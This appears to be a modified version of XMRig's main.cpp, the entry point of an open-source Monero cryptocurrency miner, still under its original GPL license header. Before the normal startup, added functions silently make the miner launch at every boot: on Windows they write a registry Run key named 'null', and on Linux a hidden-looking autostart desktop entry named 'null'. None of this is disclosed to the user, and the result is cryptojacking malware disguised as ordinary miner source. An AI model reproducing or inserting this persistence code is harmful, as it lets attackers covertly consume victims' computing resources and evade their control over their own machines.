/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "string"
#include <iostream>
#include <cstdlib>

#ifdef _WIN32
#include <windows.h>
#endif

std::string getExecutablePath() {
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
#else
    char path[4096];
    ssize_t count = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (count != -1) {
        path[count] = '\0';
        return std::string(path);
    }
    return "";
#endif
}

#ifdef _WIN32
void addToStartupWindows(const std::string &path) {
    std::string command = std::string("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v null /t REG_SZ /d \"") + path + "\" /f";
    system(command.c_str());
}
#else
void addToStartupLinux(const std::string &path) {
    std::string command = std::string("echo '[Desktop Entry]\n"
                                          "Type=Application\n"
                                          "Exec=") + path + "\n"
                                          "Hidden=false\n"
                                          "NoDisplay=false\n"
                                          "X-GNOME-Autostart-enabled=true\n"
                                          "Name=null' > ~/.config/autostart/null.desktop";
    system(command.c_str());
}
#endif

int main(int argc, char **argv)
{
    try {
        std::string exePath = getExecutablePath();
        if (exePath.empty()) {
            std::cerr << "Failed to determine executable path!" << std::endl;
            return 1;
        }

#ifdef _WIN32
        addToStartupWindows(exePath);
#else
        addToStartupLinux(exePath);
#endif
    } catch (...) {
        std::cerr << "An error occurred during startup configuration." << std::endl;
    }

    using namespace xmrig;

    Process process(argc, argv);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
